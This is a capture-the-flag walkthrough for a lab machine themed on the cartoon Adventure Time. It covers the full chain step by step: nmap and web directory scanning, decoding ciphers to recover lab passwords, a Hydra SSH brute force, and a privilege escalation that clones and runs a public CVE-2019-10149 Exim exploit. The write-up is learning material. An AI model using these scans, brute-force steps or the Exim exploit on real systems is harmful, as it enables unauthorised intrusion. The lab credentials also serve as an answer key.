# Adventure Time

## Description

Time to go on an adventure. Help Finn and Jake find BMO's reset code by solving a series of puzzles.
This is not a real-world challenge. It is intended for learning and fun.

---

## Penetration Testing Methodology

### 1. Network Scanning

**Nmap Scan**

```bash
nmap -sV 10.48.170.40

# Output
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.29
443/tcp   open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
31337/tcp open  unknown
```

---

### 2. Enumeration

**Web Enumeration (HTTPS)**
Used Gobuster:

```bash
gobuster dir -u https://10.48.170.40/ \
-w ~/hack/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
-t 59 -k
```

- Discovered directory: `/candybar`
- Found encoded string:

```
KBQWY4DONAQHE53UOJ5CA2LXOQQEQSCBEBZHIZ3JPB2XQ4TQNF2CA5LEM4QHEYLKORUC4===
```

**Decoding**

```bash
echo "KBQWY4DONAQHE53UOJ5CA2LXOQQEQSCBEBZHIZ3JPB2XQ4TQNF2CA5LEM4QHEYLKORUC4===" | base32 -d
```

Output:

```
Palpnh rwtrz iwt HHA rtgixuxrpit udg rajth.
```

- Identified as a Caesar cipher
- Decoded message:

```
Always check the SSL certificate for clues.
```

---

### 3. SSL Certificate Enumeration

- Certificate issuer:

```
https://land-of-ooo.com/
```

Accessed via:

```bash
curl https://land-of-ooo.com/ -k
```

---

### 4. Directory Bruteforcing

```bash
ffuf -w ~/hack/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt \
-u https://land-of-ooo.com/FUZZ -t 200
```

- Found: `/yellowdog`

Further enumeration:

- `/yellowdog/bananastock`
- Morse code message decoded:

```
THE BANANAS ARE THE BEST!!!
```

---

### 5. AES Decryption

Location:

```
/yellowdog/bananastock/princess
```

Found:

```html
<!--
Secrettext = 0008f1a92d287b48dccb5079eac18ad2a0c59c22fbc7827295842f670cdb3cb645de3de794320af132ab341fe0d667a85368d0df5a3b731122ef97299acc3849cc9d8aac8c3acb647483103b5ee44166
Key = my cool password
IV = abcdefghijklmanopqrstuvwxyz
Mode = CBC
Input = hex
Output = raw
-->
```

Decrypted using CyberChef:

```
the magic safe is accessible at port 31337. the magic word is: ricardio
```

---

### 6. Initial Access

```bash
telnet 10.48.170.40 31337
```

- Used magic word: `ricardio`
- Obtained credentials:
  - Username: `apple-guards`
  - Password: `THE BANANAS ARE THE BEST!!!`

SSH login:

```bash
ssh apple-guards@10.48.170.40
```

---

### 7. User Enumeration

- Located mail hint referencing user `marceline`

```bash
find / -user marceline -type f 2>/dev/null
```

- Found file:

```
/etc/fonts/helper
```

- Cipher challenge:
  - Key: `gone`
  - Value: `Gpnhkse`
  - Decoded:

```
Abadeer
```

- Password for `marceline`:

```
My friend Finn
```

---

### 8. Lateral Movement

```bash
ssh marceline@10.48.170.40
```

- Retrieved flag2

- Found binary string:

```
111111111100100010101011101011111110101111111111011011011011000001101001001011111111111111001010010111100101000000000000101001101111001010010010111111110010100000000000000000000000000000000000000010101111110010101100101000000000000000000000101001101100101001001011111111111111111111001010000000000000000000000000001010111001010000000000000000000000000000000000000000000001010011011001010010010111111111111111111111001010000000000000000000000000000000001010111111001010011011001010010111111111111100101001000000000000101001111110010100110010100100100000000000000000000010101110010100010100000000000000010100000000010101111100101001111001010011001010010000001010010100101011100101001101100101001011100101001010010100110110010101111111111111111111111111111111110010100100100000000000010100010100111110010100000000000000000000000010100111111111111110010100101111001010000000000000001010
```

- Identified as Spoon binary encoding
- Decoded result:

```
The magic word you are looking for is ApplePie
```

---

### 9. Privilege Pivot

```bash
telnet 10.48.170.40 31337
```

- Magic word: `ApplePie`
- New user:

```
peppermint-butler
Password: That Black Magic
```

```bash
ssh peppermint-butler@10.48.170.40
```

- Retrieved flag3

---

### 10. Steganography

- Transferred image via Python HTTP server

- Located supporting files:
  - `/usr/share/xml/steg.txt` → `ToKeepASecretSafe`
  - `/etc/php/zip.txt` → `ThisIsReallySave`

- Extracted hidden zip using steg tools

- Unzipped with password:

```
ThisIsReallySave
```

- Retrieved `secrets.txt`

---

### 11. Credential Bruteforce

Hint:

```
The Ice King s????
```

- Generated wordlist using crunch
- Used Hydra to brute force SSH

Result:

```
Password: The Ice King sucks
```

```bash
ssh bubblegum@10.48.170.40
```

- Retrieved flag4

---

### 12. Privilege Escalation

**SUID Check**

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Exim Configuration**

```bash
cat /etc/exim4/update-exim4.conf.conf
```

- Identified vulnerable Exim version

**Exploit**

```bash
git clone https://github.com/AzizMea/CVE-2019-10149-privilege-escalation exim4
cd exim4
nano wizard.py
# Adjust port number based on config
```

Transfer and execute:

```bash
mv wizard.py /tmp
cd /tmp
python3 wizard.py
id
```

---

### 13. Final Flags

```bash
cd /home/bubblegum/Secrets
ls
cat bmo.txt
```

---
